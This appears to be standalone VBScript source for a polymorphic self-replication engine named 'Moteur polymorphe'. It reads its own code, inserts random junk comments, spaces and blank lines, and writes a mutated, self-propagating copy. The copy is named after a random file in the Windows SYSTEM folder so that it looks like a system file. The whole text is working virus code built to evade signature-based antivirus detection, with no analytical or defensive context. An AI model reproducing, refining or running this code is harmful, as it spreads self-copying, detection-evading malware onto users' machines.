Dim F,R,G,O,T
Randomize
Set F=CreateObject("Scripting.FileSystemObject")
O="Moteur polymorphe.vbs"
G=H+".vbs"
F.CreateTextFile G
Set ts=F.OpenTextFile(G,2)
Set R=F.OpenTextFile(O,1)
Do
x=Int(Rnd*4+1)
If x=1 Then z=E
If x=2 Then z=U
If x=3 Then z=L
If x=4 Then z=K(10,20)
If x=5 Then z=vbCrLf
ts.WriteLine z 
If R.AtEndOfStream=-1 Then Exit Do
Loop
ts.Close
R.Close
Function U
If R.AtEndOfStream=0 Then T=R.ReadLine
If Left(T,1)="'" Then U
If T="" Then U
If W=0 Then U
If Left(T,2)="O=" Then T="O="+""""+G+""""
U=T
End Function
Function W
For i=1 To Len(T)
If Mid(T,i,1)<>Chr(32) Then W=2:Exit For
W=0
Next
End Function
Function J(n,m)
For i=0 To (Int(Rnd*(m-n)+n))
J=Chr(14+Int(Rnd*241))+J
Next
End Function
Function K(n,m)
K=Space(Int(Rnd*(m-n)+n))
End Function
Function L
L=J(Int(Rnd*10),Int(Rnd*10)+10)
n=Int(Rnd*3)+1
If n=1 Then y=vbCrLf
If n=2 Then y=K(Int(Rnd*3),Int(Rnd*5)+3)
If n=3 Then y=""
L="'"+L+y
End Function
Function E
d=Int(Rnd*4)+1
For a=0 To d
E=E+vbCrLf
Next
End Function
Function H
Set c=F.GetSpecialFolder(0)
c=c+"\SYSTEM"
Set D=F.GetFolder(C)
Set z=D.Files
x=0
For Each q In z
x=x+1
Next
If x<>0 Then
x=Int(Rnd*x+1)
s=0
For Each q In z
s=s+1
H=F.GetBaseName(q.name)
If s=x Then Exit For
Next
End If
If O=H+".vbs" Then x=0
If x=0 Then
H=""
b=Int(Rnd*8)+3
For n=1 To b
H=Chr(Int(Rnd*25)+65)+H
Next
End If
End Function